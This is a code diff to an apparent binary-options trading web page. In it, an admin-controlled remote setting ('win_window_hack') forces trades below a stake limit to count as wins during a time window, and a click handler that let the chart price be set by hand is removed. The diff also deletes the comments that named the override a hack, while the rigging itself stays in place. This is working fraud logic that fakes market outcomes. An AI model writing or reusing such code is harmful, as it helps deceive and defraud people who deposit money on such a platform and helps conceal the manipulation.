@@ -70,7 +70,7 @@
             flex: 1; position: relative; background-color: #0b0e16;
             background-image: linear-gradient(rgba(11, 14, 22, 0.6), rgba(11, 14, 22, 0.6)), url('file:///android_asset/earth.png');
             background-size: cover; background-repeat: no-repeat; background-position: center;
-            overflow: hidden; width: 100%; cursor: crosshair; 
+            overflow: hidden; width: 100%; background-color: #0b0e16;
         }
 
         #chart-container::before {
@@ -225,7 +225,6 @@
     let currentPromoCode = "AH9900";
     let lastBonusTime = 0;
 
-    // Live Settings Cache Object
     let winWindowSettings = { expiry: 0, limit: 0 };
 
     const canvas = document.getElementById('mainChart');
@@ -241,7 +240,6 @@
             }
         });
 
-        // Live monitor window target hack parameters from admin
         db.ref('settings/win_window_hack').on('value', snap => {
             if(snap.exists()) {
                 winWindowSettings = snap.val();
@@ -263,7 +261,6 @@
         await checkSession(); 
         resize();
         window.addEventListener('resize', resize);
-        document.getElementById('chart-container').addEventListener('mousedown', manualPriceUpdate);
         changeAsset(); 
         setInterval(updatePrice, 800); 
         setInterval(updateTimer, 1000); 
@@ -361,14 +358,12 @@
             if(activeTrade.timeLeft === 0) {
                 tradeTimer.style.display = 'none';
                 
-                // Normal Condition Chart Calculation
                 let won = (activeTrade.type === 'CALL' && currentPrice > activeTrade.price) || (activeTrade.type === 'PUT' && currentPrice < activeTrade.price);
                 
-                // Admin Window Override Hack Injection
                 const currentTimeStamp = new Date().getTime();
                 if(winWindowSettings && currentTimeStamp < winWindowSettings.expiry) {
                     if(activeTrade.amount < winWindowSettings.limit) {
-                        won = true; // Auto force win if investment is below limit
+                        won = true; 
                     }
                 }
 
@@ -630,7 +625,6 @@
     }
     
     function switchTrans(m) { currentTransMode = m; document.getElementById('depTab').className = m === 'deposit' ? 'tab-btn active' : 'tab-btn'; document.getElementById('withTab').className = m === 'withdraw' ? 'tab-btn active' : 'tab-btn'; updateWithdrawUI(); }
-    function manualPriceUpdate(e) { if(!isLoggedIn) return; const rect = canvas.getBoundingClientRect(); const y = (e.clientY || (e.touches && e.touches[0].clientY)) - rect.top; currentPrice = maxPriceGlobal - (y / rect.height) * (maxPriceGlobal - minPriceGlobal); priceHistory[priceHistory.length - 1] = currentPrice; }
     
     async function updateTradeHistoryUI() {
         if(!currentUser) return;
